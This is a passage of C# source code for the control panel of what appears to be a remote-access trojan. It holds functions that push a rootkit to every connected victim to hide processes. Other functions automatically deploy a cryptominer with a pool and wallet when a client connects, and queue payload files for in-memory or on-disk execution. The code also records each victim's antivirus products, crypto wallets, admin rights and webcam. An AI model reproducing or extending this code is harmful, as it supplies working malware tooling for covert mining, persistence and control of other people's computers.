                ToolTip = "Edit hide process name for selected rootkit task"
            };
            editItem.Click += EditAutoTaskRootkitConfig_Click;

            ctx.Items.Insert(2, deployItem);
            ctx.Items.Insert(3, new Separator());
            ctx.Items.Insert(5, editItem);
        }

        private async void DeployRootkitOnClients_Click(object sender, RoutedEventArgs e)
        {
            var win = ShowRootkitDeployDialog(false, null);
            win.ShowDialog();
        }

        private void EditAutoTaskRootkitConfig_Click(object sender, RoutedEventArgs e)
        {
            var selectedTask = _autoTasks.FirstOrDefault(t => t.IsSelected);
            if (selectedTask == null || selectedTask.ActionType != AutoTaskAction.DeployRootkit)
            {
                AppendLog("Select a Deploy Rootkit auto task to edit.");
                return;
            }

            var win = ShowRootkitDeployDialog(true, selectedTask);
            win.ShowDialog();
        }

        private Window ShowRootkitDeployDialog(bool editMode, AutoTaskItem existingTask)
        {
            var bgColor = (Color)Application.Current.Resources["BackgroundColor"];
            var surfColor = (Color)Application.Current.Resources["SurfaceColor"];
            var surfLight = (Color)Application.Current.Resources["SurfaceLightColor"];
            var txtColor = (Color)Application.Current.Resources["TextPrimaryColor"];
            var dimColor = (Color)Application.Current.Resources["TextSecondaryColor"];
            var okColor = (Color)Application.Current.Resources["SuccessColor"];
            var okHov = (Color)Application.Current.Resources["SuccessHoverColor"];
            var accColor = (Color)Application.Current.Resources["PrimaryColor"];
            var accHov = (Color)Application.Current.Resources["PrimaryHoverColor"];
            var txtBr = new SolidColorBrush(txtColor);
            var dimBr = new SolidColorBrush(dimColor);
            var bgBr = new SolidColorBrush(bgColor);
            var sfBr = new SolidColorBrush(surfColor);
            var slBr = new SolidColorBrush(surfLight);
            var okBr = new SolidColorBrush(okColor);
            var okHb = new SolidColorBrush(okHov);
            var acBr = new SolidColorBrush(accColor);
            var acHb = new SolidColorBrush(accHov);

            var win = new Window
            {
                Title = editMode ? "Edit Rootkit Config" : "Deploy $tp Rootkit to All Clients",
                Width = 480,
                Height = 400,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = this,
                ResizeMode = ResizeMode.NoResize,
                Background = bgBr,
                Foreground = txtBr
            };

            var root = new Grid();
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(4) });
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });

            var hdr = new Border { Background = sfBr, Padding = new Thickness(10) };
            hdr.Child = new TextBlock { Text = "$tp Rootkit Deployment", FontSize = 14, FontWeight = FontWeights.SemiBold, Foreground = txtBr };
            Grid.SetRow(hdr, 0);
            root.Children.Add(hdr);

            var infoBar = new Border { Background = sfBr, Padding = new Thickness(10) };
            infoBar.Child = new TextBlock
            {
                Text = "Auto-detects miner process on each client. Installs and configures $tp rootkit automatically.",
                Foreground = dimBr, FontSize = 12, TextWrapping = TextWrapping.Wrap
            };
            Grid.SetRow(infoBar, 1);
            root.Children.Add(infoBar);

            var bb = new Border { Background = slBr, Padding = new Thickness(10, 6, 10, 6) };
            var bp = new StackPanel { Orientation = Orientation.Horizontal };
            var buildBtn = new Button { Content = "Deploy & Install", Foreground = Brushes.White, Background = okBr, BorderThickness = new Thickness(1), Padding = new Thickness(8, 4, 8, 4), Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
            var closeBtn = new Button { Content = "Close", Foreground = txtBr, Background = acBr, BorderThickness = new Thickness(1), Padding = new Thickness(8, 4, 8, 4), Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
            var statusText = new TextBlock { Text = editMode ? "Edit then close" : "Ready", Foreground = dimBr, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 0, 0) };
            bp.Children.Add(buildBtn);
            bp.Children.Add(closeBtn);
            bp.Children.Add(statusText);
            bb.Child = bp;
            Grid.SetRow(bb, 2);
            root.Children.Add(bb);

            var progress = new ProgressBar { Height = 4, Minimum = 0, Maximum = 100, Value = 0, Visibility = Visibility.Collapsed, Foreground = acBr };
            Grid.SetRow(progress, 3);
            root.Children.Add(progress);

            var logBox = new TextBox
            {
                Background = bgBr, Foreground = new SolidColorBrush(Color.FromRgb(100, 220, 100)),
                BorderThickness = new Thickness(0), FontFamily = new FontFamily("Consolas"),
                FontSize = 11, IsReadOnly = true, TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto, Padding = new Thickness(4),
                CaretBrush = Brushes.Transparent, AcceptsReturn = true, Style = null,
                Margin = new Thickness(0, 0, 0, 0)
            };
            Grid.SetRow(logBox, 4);
            root.Children.Add(logBox);

            win.Content = root;

            void Log(string msg)
            {
                string line = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + msg + "\n";
                logBox.AppendText(line);
                logBox.ScrollToEnd();
            }

            bool busy = false;
            buildBtn.Click += async (s, ev) =>
            {
                if (busy) return;
                busy = true;
                buildBtn.IsEnabled = false;
                progress.Visibility = Visibility.Visible;
                progress.Value = 0;
                statusText.Text = "Deploying...";
                Log("Starting rootkit deployment to all connected clients...");

                try
                {
                    if (!_pluginHost.LoadedPlugins.TryGetValue("rootkit", out var rkPlugin) || !(rkPlugin is WpfApp.Plugins.Builtin.RootkitPlugin rk))
                    {
                        Log("Rootkit plugin not loaded.");
                        return;
                    }

                    progress.Value = 10;

                    if (!await rk.EnsureR77Downloaded())
                    {
                        Log("Failed to download rootkit binaries.");
                        return;
                    }

                    progress.Value = 30;
                    Log("Rootkit binaries ready.");

                    int deployCount = 0;
                    int failCount = 0;
                    var connected = Enumerable.Empty<string>();

                    if (_tcpServer != null)
                    {
                        connected = _tcpServer.GetConnectedClientIds();
                        int total = connected.Count();
                        Log($"Found {total} connected client(s).");
                        foreach (var cid in connected)
                        {
                            Log($"Deploying to {cid} (auto-detect client stub)...");
                            try
                            {
                                bool ok = await rk.DeployAndInstallForClient(cid, "self");
                                if (ok)
                                {
                                    deployCount++;
                                    Log($"Deployed to {cid}");
                                }
                                else
                                {
                                    failCount++;
                                    Log($"Failed to deploy to {cid}");
                                }
                            }
                            catch (Exception ex)
                            {
                                failCount++;
                                Log($"Error deploying to {cid}: {ex.Message}");
                            }
                            progress.Value = 30 + (int)(60.0 * (deployCount + failCount) / total);
                        }
                    }

                    progress.Value = 95;

                    string savedPname = "self";

                    AutoTaskItem task;
                    if (editMode && existingTask != null)
                    {
                        task = existingTask;
                        if (!string.IsNullOrEmpty(savedPname)) task.RootkitProcessName = savedPname;
                    }
                    else
                    {
                        task = new AutoTaskItem(
                            Guid.NewGuid().ToString(),
                            "$tp Rootkit",
                            "",
                            true,
                            0,
                            null,
                            null,
                            false,
                            AutoTaskAction.DeployRootkit,
                            null, null, null, 50,
                            savedPname
                        );
                        _autoTasks.Add(task);
                        _taskExecutionLog.TryAdd(task.Id, new List<string>());
                    }

                    string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Deployed rootkit to {deployCount} client(s) (auto-detected)";
                    _taskExecutionLog.AddOrUpdate(
                        task.Id,
                        _ => new List<string> { logEntry },
                        (_, list) =>
                        {
                            lock (_taskLogLock)
                            {
                                list.Add(logEntry);
                                if (list.Count > 100)
                                    list.RemoveAt(0);
                            }
                            return list;
                        });

                    SaveAutoTasks();
                    UpdateAutoTaskCount();

                    progress.Value = 100;
                    statusText.Text = $"Deployed to {deployCount} client(s)";
                    Log($"Done. {deployCount} succeeded, {failCount} failed.");
                    AppendLog($"Auto task: Deployed $tp Rootkit to {deployCount} client(s) (auto-detected)");
                }
                catch (Exception ex)
                {
                    Log("Error: " + ex.Message);
                    statusText.Text = "Failed";
                }
                finally
                {
                    busy = false;
                    buildBtn.IsEnabled = true;
                    await Task.Delay(2000);
                    progress.Visibility = Visibility.Collapsed;
                }
            };

            closeBtn.Click += (s, ev) => win.Close();

            return win;
        }

        private TextBox AddRow(Grid grid, int row, string label, string defaultValue, SolidColorBrush txtBr, SolidColorBrush dimBr, SolidColorBrush bgBr)
        {
            var lbl = new TextBlock
            {
                Text = label,
                Foreground = dimBr,
                FontSize = 12,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 4, 6, 2)
            };
            Grid.SetRow(lbl, row); Grid.SetColumn(lbl, 0);
            grid.Children.Add(lbl);

            var borderColor = (Color)Application.Current.Resources["BorderColor"];
            var bb = new SolidColorBrush(borderColor);
            var tb = new TextBox
            {
                Text = defaultValue,
                Foreground = txtBr,
                Background = bgBr,
                BorderBrush = bb,
                BorderThickness = new Thickness(1),
                Padding = new Thickness(10, 8, 10, 8),
                FontSize = 13,
                VerticalContentAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 2, 0, 4)
            };
            Grid.SetRow(tb, row); Grid.SetColumn(tb, 1);
            grid.Children.Add(tb);
            return tb;
        }

        private Button MakeMiniBtn(string text, SolidColorBrush bg, SolidColorBrush hv, SolidColorBrush fg)
        {
            var nb = bg; var hb = hv;
            var bb = new SolidColorBrush(Color.FromRgb(60, 60, 80));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1)); bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4)); bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            tp.Seal();
            return new Button { Content = text, Template = tp, Foreground = fg, Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        private void RemoveAutoTaskButton_Click(object sender, RoutedEventArgs e)
        {
            var selectedTasks = _autoTasks.Where(t => t.IsSelected).ToList();

            if (selectedTasks.Count == 0)
            {
                AppendLog("No auto tasks selected for removal.");
                return;
            }

            foreach (var task in selectedTasks)
            {
                _autoTasks.Remove(task);
                _taskExecutionLog.TryRemove(task.Id, out _);
                AppendLog($"Removed auto task: {task.Name}");
            }

            SaveAutoTasks();
            UpdateAutoTaskCount();
        }

        private void ToggleAutoTaskButton_Click(object sender, RoutedEventArgs e)
        {
            var selectedTasks = _autoTasks.Where(t => t.IsSelected).ToList();

            if (selectedTasks.Count == 0)
            {
                AppendLog("No auto tasks selected.");
                return;
            }

            foreach (var task in selectedTasks)
            {
                task.IsEnabled = !task.IsEnabled;
                AppendLog($"Auto task '{task.Name}' is now {(task.IsEnabled ? "enabled" : "disabled")}.");
            }

            SaveAutoTasks();
            UpdateAutoTaskCount();
        }

        private void ToggleAutoTaskModeButton_Click(object sender, RoutedEventArgs e)
        {
            var selectedTasks = _autoTasks.Where(t => t.IsSelected).ToList();

            if (selectedTasks.Count == 0)
            {
                AppendLog("No auto tasks selected.");
                return;
            }

            foreach (var task in selectedTasks)
            {
                task.UseInMemory = !task.UseInMemory;
                string modeStr = task.UseInMemory ? "In-Memory" : "Drop-to-Disk";
                AppendLog($"Auto task '{task.Name}' execution mode changed to: {modeStr}");
            }

            SaveAutoTasks();
        }

        private void ViewTaskLogButton_Click(object sender, RoutedEventArgs e)
        {
            var selectedTask = _autoTasks.FirstOrDefault(t => t.IsSelected);

            if (selectedTask == null)
            {
                AppendLog("Select a task to view its execution log.");
                return;
            }

            if (!_taskExecutionLog.TryGetValue(selectedTask.Id, out var log))
            {
                AppendLog($"No execution log for task '{selectedTask.Name}'.");
                return;
            }

            List<string> logSnapshot;
            lock (_taskLogLock)
            {
                if (log.Count == 0)
                {
                    AppendLog($"No execution log for task '{selectedTask.Name}'.");
                    return;
                }
                logSnapshot = new List<string>(log);
            }

            var logWindow = new Window
            {
                Title = $"Execution Log — {selectedTask.Name}",
                Width = 650,
                Height = 420,
                WindowStartupLocation = WindowStartupLocation.CenterOwner,
                Owner = this,
                Background = new SolidColorBrush((Color)Application.Current.Resources["BackgroundColor"]),
                Foreground = new SolidColorBrush((Color)Application.Current.Resources["TextPrimaryColor"])
            };

            var logBox = new TextBox
            {
                IsReadOnly = true,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                HorizontalScrollBarVisibility = ScrollBarVisibility.Auto,
                FontFamily = new FontFamily("Cascadia Mono, Consolas, monospace"),
                FontSize = 12,
                Padding = new Thickness(12),
                Background = new SolidColorBrush((Color)Application.Current.Resources["SurfaceColor"]),
                Foreground = new SolidColorBrush((Color)Application.Current.Resources["TextPrimaryColor"]),
                BorderThickness = new Thickness(0),
                Text = string.Join(Environment.NewLine, logSnapshot)
            };

            logWindow.Content = logBox;
            logWindow.ShowDialog();
        }

        private async Task ExecuteAutoTasksForClient(string displayId)
        {
            if (_serverStopping) return;

            if (!_autoTasksExecutedFor.TryAdd(displayId, true))
            {
                AppendLog($"Auto tasks already executed for '{displayId}' — skipping.");
                return;
            }

            List<AutoTaskItem> enabledTasks;

            try
            {
                var tcs = new TaskCompletionSource<List<AutoTaskItem>>();
                Dispatcher.BeginInvoke(() =>
                {
                    try
                    {
                        tcs.TrySetResult(_autoTasks.Where(t => t.IsEnabled).ToList());
                    }
                    catch (Exception ex)
                    {
                        tcs.TrySetException(ex);
                    }
                });

                enabledTasks = await tcs.Task;
            }
            catch (Exception ex)
            {
                AppendLog($"Error reading auto tasks: {ex.Message}");
                return;
            }

            AppendLog($"Checking auto tasks for new client '{displayId}': {enabledTasks.Count} enabled task(s)");

            if (enabledTasks.Count == 0)
            {
                AppendLog($"No enabled auto tasks to run for '{displayId}'.");
                return;
            }

            if (_tcpServer == null || _serverStopping)
            {
                AppendLog("Cannot execute auto tasks: server is not running.");
                return;
            }

            string rawId = ResolveRawClientId(displayId);
            if (!_tcpServer.IsClientConnected(rawId))
            {
                AppendLog($"Cannot execute auto tasks: Client '{displayId}' is not connected.");
                _autoTasksExecutedFor.TryRemove(displayId, out _);
                return;
            }

            int successCount = 0;
            int failCount = 0;

            foreach (var task in enabledTasks)
            {
                if (_serverStopping) break;

                if (task.ActionType == AutoTaskAction.StartMiner)
                {
                    try
                    {
                        _pluginHost.LoadedPlugins.TryGetValue("miner", out var minerPlugin);
                        var mp = minerPlugin as WpfApp.Plugins.Builtin.MinerPlugin;
                        if (mp == null)
                        {
                            AppendLog($"Auto task '{task.Name}': Miner plugin not loaded.");
                            failCount++;
                            continue;
                        }

                        bool deployed = await mp.DeployAndStartForClient(rawId, task.Pool, task.Wallet, task.Worker, task.ThreadCount, false);
                        if (!deployed)
                        {
                            AppendLog($"Auto task '{task.Name}': Failed to deploy miner for {displayId}.");
                            failCount++;
                            continue;
                        }

                        Dispatcher.BeginInvoke(() =>
                        {
                            task.RunCount++;
                            task.LastRun = DateTime.Now;
                            task.LastClient = displayId;
                        });

                        string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Deployed miner to client: {displayId} (pool: {task.Pool})";
                        _taskExecutionLog.AddOrUpdate(
                            task.Id,
                            _ => new List<string> { logEntry },
                            (_, list) =>
                            {
                                lock (_taskLogLock)
                                {
                                    list.Add(logEntry);
                                    if (list.Count > 100)
                                        list.RemoveAt(0);
                                }
                                return list;
                            });

                        successCount++;
                        AppendLog($"Auto task '{task.Name}': Miner deployed to {displayId}");
                    }
                    catch (Exception ex)
                    {
                        failCount++;
                        AppendLog($"Failed to execute auto task '{task.Name}' for {displayId}: {ex.Message}");
                    }
                    continue;
                }

                if (task.ActionType == AutoTaskAction.DeployRootkit)
                {
                    try
                    {
                        _pluginHost.LoadedPlugins.TryGetValue("rootkit", out var rkPlugin);
                        var rk = rkPlugin as WpfApp.Plugins.Builtin.RootkitPlugin;
                        if (rk == null)
                        {
                            AppendLog($"Auto task '{task.Name}': Rootkit plugin not loaded.");
                            failCount++;
                            continue;
                        }

                        string pname = task.RootkitProcessName;
                        if (string.IsNullOrEmpty(pname)) pname = "self";

                        if (!await rk.EnsureR77Downloaded())
                        {
                            AppendLog($"Auto task '{task.Name}': Failed to download rootkit binaries.");
                            failCount++;
                            continue;
                        }

                        bool deployed = await rk.DeployAndInstallForClient(rawId, pname);
                        if (!deployed)
                        {
                            AppendLog($"Auto task '{task.Name}': Failed to deploy rootkit for {displayId}.");
                            failCount++;
                            continue;
                        }

                        Dispatcher.BeginInvoke(() =>
                        {
                            task.RunCount++;
                            task.LastRun = DateTime.Now;
                            task.LastClient = displayId;
                        });

                        string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Deployed rootkit to client: {displayId} (hide: {pname})";
                        _taskExecutionLog.AddOrUpdate(
                            task.Id,
                            _ => new List<string> { logEntry },
                            (_, list) =>
                            {
                                lock (_taskLogLock)
                                {
                                    list.Add(logEntry);
                                    if (list.Count > 100)
                                        list.RemoveAt(0);
                                }
                                return list;
                            });

                        successCount++;
                        AppendLog($"Auto task '{task.Name}': Rootkit deployed to {displayId}");
                    }
                    catch (Exception ex)
                    {
                        failCount++;
                        AppendLog($"Failed to execute auto task '{task.Name}' for {displayId}: {ex.Message}");
                    }
                    continue;
                }

                if (!File.Exists(task.FilePath))
                {
                    AppendLog($"Auto task '{task.Name}' file not found: {task.FilePath}");
                    failCount++;
                    continue;
                }

                try
                {
                    string fileHash = ComputeFileHash(task.FilePath);
                    var execMode = task.UseInMemory ? ExecutionMode.InMemory : ExecutionMode.DropToDisk;

                    _tcpServer.EnqueueFileForClient(rawId, task.FilePath, fileHash, execMode);

                    Dispatcher.BeginInvoke(() =>
                    {
                        task.RunCount++;
                        task.LastRun = DateTime.Now;
                        task.LastClient = displayId;
                    });

                    string modeStr = task.UseInMemory ? "in-memory" : "drop-to-disk";
                    string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Sent to client: {displayId} (mode: {modeStr})";

                    _taskExecutionLog.AddOrUpdate(
                        task.Id,
                        _ => new List<string> { logEntry },
                        (_, list) =>
                        {
                            lock (_taskLogLock)
                            {
                                list.Add(logEntry);
                                if (list.Count > 100)
                                    list.RemoveAt(0);
                            }
                            return list;
                        });

                    successCount++;
                    AppendLog($"Auto task '{task.Name}' queued for {displayId} ({modeStr})");
                }
                catch (Exception ex)
                {
                    failCount++;
                    AppendLog($"Failed to execute auto task '{task.Name}' for {displayId}: {ex.Message}");
                }
            }

            AppendLog($"Auto tasks complete for '{displayId}': {successCount} sent, {failCount} failed.");

            SaveAutoTasks();
            UpdateAutoTaskCount();
        }

        private void UpdateAutoTaskCount()
        {
            Dispatcher.BeginInvoke(() =>
            {
                int total = _autoTasks.Count;
                int enabled = _autoTasks.Count(t => t.IsEnabled);
                int inMemCount = _autoTasks.Count(t => t.UseInMemory);
                int totalRuns = _autoTasks.Sum(t => t.RunCount);

                if (autoTaskStatusLbl != null)
                    autoTaskStatusLbl.Text = $"Auto: {enabled}/{total} tasks ({totalRuns} runs)";
            });
        }

        // ==================== EXECUTION MODE HELPERS ====================

        private ExecutionMode GetSelectedExecutionMode()
        {
            return _currentExecutionMode;
        }

        private void SetSelectedExecutionMode(ExecutionMode mode)
        {
            _currentExecutionMode = mode;
            UpdateExecutionModeIndicator();
        }

        private bool ValidateInMemoryCompatibility(string filePath)
        {
            string ext = Path.GetExtension(filePath).ToLowerInvariant();

            switch (ext)
            {
                case ".exe":
                case ".dll":
                    return true;

                case ".bat":
                case ".cmd":
                case ".ps1":
                case ".vbs":
                case ".js":
                    AppendLog($"WARNING: '{ext}' files use script-based in-memory execution.");
                    return true;

                default:
                    AppendLog($"WARNING: '{ext}' files may not support true in-memory execution.");
                    return true;
            }
        }

        // ==================== CLIENT ID MAPPING ====================

        private string AssignDisplayId(string rawClientId, ClientInfoData clientInfo)
        {
            if (_serverStopping) return null;

            // Fast path: same rawId already has a display ID
            if (_rawToDisplayId.TryGetValue(rawClientId, out string existingDisplayId))
            {
                _displayIdClientInfo[existingDisplayId] = new ClientInfoData
                {
                    OSVersion = clientInfo.OSVersion ?? "",
                    MachineName = clientInfo.MachineName ?? "",
                    AntivirusProducts = clientInfo.AntivirusProducts ?? "",
                    CryptoWallet = clientInfo.CryptoWallet ?? "",
                    IsAdmin = clientInfo.IsAdmin ?? "Unknown",
                    HasWebcam = clientInfo.HasWebcam ?? "Unknown"
                };

                return existingDisplayId;
            }

            string machineName = (clientInfo.MachineName ?? "").Trim();

            if (string.IsNullOrWhiteSpace(machineName) || machineName == "Unknown")
                machineName = "client";

            machineName = new string(machineName.Where(c => !char.IsControl(c) && c != '|' && c != ':').ToArray());
            if (string.IsNullOrWhiteSpace(machineName))
                machineName = "client";

            string displayId;

            lock (_idAssignmentLock)
            {
                if (_serverStopping) return null;

                if (_rawToDisplayId.TryGetValue(rawClientId, out existingDisplayId))
                    return existingDisplayId;

                displayId = machineName;

                if (_displayToRawId.ContainsKey(displayId))
                {
                    string suffix = rawClientId.Length >= 4 ? rawClientId[..4] : rawClientId;
                    displayId = $"{machineName}_{suffix}";
                }

                while (_displayToRawId.ContainsKey(displayId))
                {
                    string suffix = rawClientId.Length >= 6 ? rawClientId[..6] : rawClientId;
                    displayId = $"{machineName}_{suffix}";
                }

                // Commit mappings inside lock to prevent races
                _rawToDisplayId[rawClientId] = displayId;
                _displayToRawId[displayId] = rawClientId;
            }

            _displayIdClientInfo[displayId] = new ClientInfoData
            {
                OSVersion = clientInfo.OSVersion ?? "",
                MachineName = clientInfo.MachineName ?? "",
                AntivirusProducts = clientInfo.AntivirusProducts ?? "",
                CryptoWallet = clientInfo.CryptoWallet ?? "",
                IsAdmin = clientInfo.IsAdmin ?? "Unknown",
                HasWebcam = clientInfo.HasWebcam ?? "Unknown"
            };

            return displayId;
        }

        public string ResolveStableClientId(string rawId)
        {
            if (string.IsNullOrWhiteSpace(rawId)) return rawId;
            if (_rawToDisplayId.TryGetValue(rawId, out string displayId))
                return displayId;
            return rawId;
        }

        public string ResolveRawClientId(string displayId)
        {
            if (string.IsNullOrWhiteSpace(displayId)) return displayId;
            if (_displayToRawId.TryGetValue(displayId, out string rawId))
                return rawId;
            return displayId;
        }

        private void RemoveClientTracking(string displayId)
        {
            _clientLastSeen.TryRemove(displayId, out _);
            _autoTasksExecutedFor.TryRemove(displayId, out _);
            _disconnectGracePeriod.TryRemove(displayId, out _);
            _displayIdClientInfo.TryRemove(displayId, out _);

            if (_displayToRawId.TryRemove(displayId, out string rawId))
                _rawToDisplayId.TryRemove(rawId, out _);
        }

        private void ClearAllClientState()
        {
            _serverStopping = true;

            _rawToDisplayId.Clear();
            _displayToRawId.Clear();
            _clientLastSeen.Clear();
            _autoTasksExecutedFor.Clear();
            _disconnectGracePeriod.Clear();
            _displayIdClientInfo.Clear();

            Dispatcher.BeginInvoke(() =>
            {
                ClientItems.Clear();
                UpdateClientCount();

                var allWindows = _pluginWindows.Values.ToList();
                _pluginWindows.Clear();
                foreach (var window in allWindows)
                {
                    try { window.Close(); } catch { }
                }

                if (tabControl.SelectedItem == null)
                    tabControl.SelectedItem = clientsTab;

                UpdateActivePluginCount();
            });

            AppendLog("All client state cleared.");
        }

        // ==================== OS VERSION RESOLUTION ====================

        public static string ResolveOSVersion(string rawVersion)
        {
            if (string.IsNullOrWhiteSpace(rawVersion))
                return "Unknown OS";

            string trimmed = rawVersion.Trim();

            if (IsFriendlyWindowsName(trimmed))
                return trimmed;

            string versionPart = ExtractVersionNumbers(trimmed);

            if (!string.IsNullOrEmpty(versionPart))
            {
                string friendly = MapBuildToFriendlyName(versionPart);
                if (!string.IsNullOrEmpty(friendly))
                    return friendly;
            }

            if (trimmed.StartsWith("Microsoft Windows", StringComparison.OrdinalIgnoreCase))
            {
                string afterMs = trimmed.Substring("Microsoft Windows".Length).Trim();
                if (afterMs.Length > 0 && !afterMs.StartsWith("NT") && !char.IsDigit(afterMs[0]))
                    return trimmed;
            }

            return trimmed;
        }

        private static bool IsFriendlyWindowsName(string value)
        {
            string[] friendlyPatterns = {
                "Windows 11", "Windows 10", "Windows 8.1", "Windows 8",
                "Windows 7", "Windows Vista", "Windows XP",
                "Windows Server 2025", "Windows Server 2022", "Windows Server 2019",
                "Windows Server 2016", "Windows Server 2012"
            };

            foreach (var pattern in friendlyPatterns)
            {
                if (value.IndexOf(pattern, StringComparison.OrdinalIgnoreCase) >= 0)
                    return true;
            }

            return false;
        }

        private static string ExtractVersionNumbers(string raw)
        {
            var match = Regex.Match(raw, @"(\d+\.\d+\.\d+(?:\.\d+)?)");
            if (match.Success)
                return match.Groups[1].Value;

            match = Regex.Match(raw, @"(\d+\.\d+)");
            if (match.Success)
                return match.Groups[1].Value;

            return null;
        }

        private static string MapBuildToFriendlyName(string version)
        {
            string[] parts = version.Split('.');
            if (parts.Length < 2) return null;

            if (!int.TryParse(parts[0], out int major)) return null;
            if (!int.TryParse(parts[1], out int minor)) return null;
            int build = 0;
            if (parts.Length >= 3)
                int.TryParse(parts[2], out build);

            if (major == 10 && minor == 0 && build >= 22000)
                return $"Windows 11 {GetWin11Version(build)}";

            if (major == 10 && minor == 0 && build > 0)
                return $"Windows 10 {GetWin10Version(build)}";

            if (major == 10 && minor == 0 && build == 0)
                return "Windows 10";

            if (major == 6 && minor == 3)
                return "Windows 8.1";

            if (major == 6 && minor == 2)
                return "Windows 8";

            if (major == 6 && minor == 1)
                return "Windows 7";

            if (major == 6 && minor == 0)
                return "Windows Vista";

            if (major == 5 && minor == 1)
                return "Windows XP";

            if (major == 5 && minor == 2)
                return "Windows XP x64 / Server 2003";

            return null;
        }

        private static string GetWin11Version(int build)
        {
            if (build >= 26100) return "24H2";
            if (build >= 22631) return "23H2";
            if (build >= 22621) return "22H2";
            if (build >= 22000) return "21H2";
            return "";
        }

        private static string GetWin10Version(int build)
        {
            if (build >= 19045) return "22H2";
            if (build >= 19044) return "21H2";
            if (build >= 19043) return "21H1";
            if (build >= 19042) return "20H2";
            if (build >= 19041) return "2004";
            if (build >= 18363) return "1909";
            if (build >= 18362) return "1903";
            if (build >= 17763) return "1809";
            if (build >= 17134) return "1803";
            if (build >= 16299) return "1709";
            if (build >= 15063) return "1703";
            if (build >= 14393) return "1607";
            if (build >= 10586) return "1511";
            if (build >= 10240) return "1507";
            return "";
        }

        // ==================== TAB TOOLBAR WIRING ====================

        private void WireToolbarEvents()
        {
            var tc = tabControl;
            if (tc.Template == null) return;
            if (tc.Template.FindName("searchTextBox", tc) is TextBox tb) _searchTextBox = tb;
            if (tc.Template.FindName("searchButton", tc) is Button sb) sb.Click += SearchButton_Click;
            if (tc.Template.FindName("refreshButton", tc) is Button rb) rb.Click += RefreshButton_Click;
            if (tc.Template.FindName("selectAllButton", tc) is Button ab) ab.Click += SelectAllButton_Click;
            if (tc.Template.FindName("selectNoneButton", tc) is Button nb) nb.Click += SelectNoneButton_Click;
        }

        // ==================== WINDOW EVENTS ====================

        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            WireToolbarEvents();
            tabControl.SelectedItem = clientsTab;
            UpdateConnectionIndicator(false);
            UpdateAutoTaskCount();

            SetSelectedExecutionMode(ExecutionMode.DropToDisk);

            await _pluginManager.LoadAllPlugins();

            BuildClientContextMenu();
            RefreshPluginCards();

            AppendLog($"Plugin system initialized. {_pluginHost.LoadedPlugins.Count} plugin(s) loaded.");

            if (!CertificateManager.CertificateExists())
            {
                AppendLog("No server certificate found. Opening certificate setup dialog...");
                var dialog = new CertificateDialog { Owner = this };
                if (dialog.ShowDialog() == true)
                {
                    _serverCertificate = dialog.Certificate;
                    AppendLog("Server certificate loaded successfully.");
                }
                else
                {
                    AppendLog("Server certificate is required. The server will not start without one.");
                }
            }
            else
            {
                try
                {
                    _serverCertificate = CertificateManager.LoadCertificate();
                    AppendLog("Server certificate loaded from disk.");
                }
                catch (Exception ex)
                {
                    AppendLog($"Failed to load certificate: {ex.Message}");
                }
            }

            UpdateCertUI();

            if (chkAutoListen?.IsChecked == true && !string.IsNullOrWhiteSpace(listenportTextBox.Text))
            {
                StartServer();
            }

            InitDiscordRpc();
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            SaveSettings();
            SaveAutoTasks();

            _serverStopping = true;

            _pluginHost?.SetTcpServer(null);

            _tcpServer?.Stop();
            _tcpServer?.Dispose();
            _tcpServer = null;

            _clientCheckTimer?.Stop();

            _pluginHost?.Dispose();

            _discordClient?.Dispose();

            base.OnClosing(e);
        }

        private void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (e.AddedItems.Count > 0 && e.AddedItems[0] == themesTab)
            {
                LoadThemeCards();
            }

            if (e.AddedItems.Count > 0 && e.AddedItems[0] == settingsTab)
            {
                if (string.IsNullOrWhiteSpace(listenportTextBox.Text) && !string.IsNullOrWhiteSpace(builderPortTextBox.Text))
                    listenportTextBox.Text = builderPortTextBox.Text;

                if (string.IsNullOrWhiteSpace(HttpPasswordBox.Password) && !string.IsNullOrWhiteSpace(_builderActualPassword))
                    HttpPasswordBox.Password = _builderActualPassword;
            }

            if (e.AddedItems.Count > 0 && e.AddedItems[0] == networkTab)
            {
